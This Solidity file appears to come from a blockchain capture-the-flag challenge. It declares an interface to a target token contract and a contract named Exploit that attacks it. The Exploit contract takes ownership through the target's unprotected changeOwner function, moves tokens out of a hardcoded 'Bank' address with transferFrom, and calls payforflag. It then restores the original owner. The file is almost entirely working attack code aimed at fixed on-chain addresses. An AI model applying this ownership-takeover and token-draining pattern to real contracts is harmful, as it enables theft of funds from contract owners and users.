/**
 *Submitted for verification at Etherscan.io on 2022-01-18
*/

pragma solidity ^0.4.18;

contract Instance{
  uint256 _decimals; // STORAGE[0x0]
  uint256 _totalSupply; // STORAGE[0x1]
  address  _owner; // STORAGE[0x2]
  function transferFrom(address varg0, address varg1, uint256 varg2) public payable returns(bool);
  function balanceOf(address varg0) public payable returns(uint256);
  function payforflag(string _parm) payable public;
  function owner() public view returns(address);
  function changeOwner(address varg0) public;
  function allowance(address varg0, address varg1) view public returns(uint256);
  function approve(address varg0, uint256 varg1) public returns(bool);
  function totalSupply() view public returns(uint256) ;
}

contract Exploit{
    Instance instance;
    address contract_adr = 0xB663B3A8492650dDdCb9891fAeDFf84a8BC9b6c3;
    address public Bank_adr = 0x97d7a33ea4d23bb78e35dc8b4d23d782db9e05b7;

    function Exploit() public{
        instance = Instance(contract_adr);
    }
    function changeOwner() public{
        instance.changeOwner(this);
    }

    function transferFrom() public payable{
        instance.transferFrom(Bank_adr, this, 1000000);
    }

    function payforflag() payable public{
        instance.payforflag("Y3dtankxMzE0QDEyNi5jb20=");
    }

    function resertOwner() public{
        address ori_owner = 0x97d7a33ea4d23bb78e35dc8b4d23d782db9e05b7;
        instance.changeOwner(ori_owner);
    }

    function balanceOf(address varg0) public payable returns(uint256){
        return instance.balanceOf(varg0);
    }

    function balanceOfBank() view public returns(uint256){
        return instance.balanceOf(Bank_adr);
    }

    function balanceOfExploit() view public returns(uint256){
        return instance.balanceOf(this);
    }

    function owner() public view returns(address){
        return instance.owner();
    }

}